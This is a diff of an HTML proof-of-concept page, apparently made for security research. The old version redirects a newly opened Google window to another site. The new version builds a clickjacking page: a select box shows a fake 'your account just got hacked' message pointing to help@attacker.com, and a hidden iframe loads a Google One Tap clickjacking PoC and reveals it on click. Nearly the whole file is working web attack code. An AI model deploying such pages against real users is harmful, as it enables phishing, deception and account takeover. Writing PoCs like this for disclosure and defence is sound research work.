@@ -1,9 +1,39 @@
-<input onclick="start()" type="button" value="Click here" />
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Show iframe on select</title>
+  <style>
+    /* Initially hide the iframe */
+    #clickjackIframe {
+      display: none;
+    }
+  </style>
+</head>
+<body>
 
-<script>
-  function start(){
-  var x = window.open('https://www.google.com');
-    setTimeout(function(){x.location="http://hb.com"}, 1000)
-  }
+  <div id="content">
+    <div>
+      <select id="mySelect" focus onfocus="document.getElementById('mySelect').click()" onclick="showIframe()">
+        <option disabled selected>&emsp;</option>
+        <option disabled></option>
+        <option disabled>&emsp;&emsp;Your account just got hacked. Email help@attacker.com to save your account.</option>
+        <option disabled></option>
+        <option disabled></option>
+      </select>
+    </div>
 
+    <!-- The iframe is initially hidden -->
+    <iframe id="clickjackIframe" src="https://pocs.work/pocs/2024/google-one-tap-clickjacking/gis.html" width="500px" height="300px"></iframe>
+  </div>
+
+  <script>
+    function showIframe() {
+      // Show the iframe when an option is selected
+      document.getElementById("clickjackIframe").style.display = "block";
+    }
   </script>
+
+</body>
+</html>
